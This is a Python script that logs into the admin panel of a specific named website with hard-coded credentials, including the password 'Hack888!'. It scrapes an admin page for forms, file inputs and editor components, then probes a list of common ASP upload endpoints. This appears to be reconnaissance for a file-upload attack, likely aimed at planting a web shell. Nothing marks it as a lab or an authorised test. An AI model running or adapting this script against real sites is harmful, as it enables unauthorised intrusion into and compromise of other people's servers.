import requests, re

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hermes", "t2": "Hack888!", "t3": "1234"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

r = s.get("http://bjhzsv.com/main/menu_edit.asp?id=4", timeout=10)
t = r.content.decode("gb2312", errors="replace")

# Find all forms, inputs, and upload references
forms = re.findall(r'<form[^>]*>', t)
inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', t)
file_inputs = re.findall(r'type=["\']file["\']', t, re.I)
editor_refs = re.findall(r'(kindeditor|ueditor|ckeditor|fckeditor|editor|textarea)', t, re.I)

print("Size:", len(t))
print("Forms:", len(forms))
print("File inputs:", len(file_inputs))
print("Editor refs:", editor_refs[:10])
print("Input fields:", inputs[:20])

# Look for upload paths
upload_paths = re.findall(r'(upload|upfile|ueditor|kindeditor|editor)[^"\'\s]*', t, re.I)
print("Upload paths:", list(set(upload_paths))[:20])

# Print full content focusing on forms
for i, form in enumerate(forms):
    print("\n--- FORM", i, "---")
    print(form)

# Also check for image/upload ASP endpoints
print("\n=== Checking upload endpoints ===")
for ep in ["upfile.asp", "upload.asp", "uploadpic.asp", "inc/upfile.asp", 
           "inc/upload.asp", "ueditor/asp/controller.asp", "kindeditor/asp/upload_json.asp"]:
    r2 = s.get("http://bjhzsv.com/main/" + ep, timeout=5)
    if r2.status_code != 404 and len(r2.text) > 0:
        print("%s: %d bytes" % (ep, len(r2.text)))
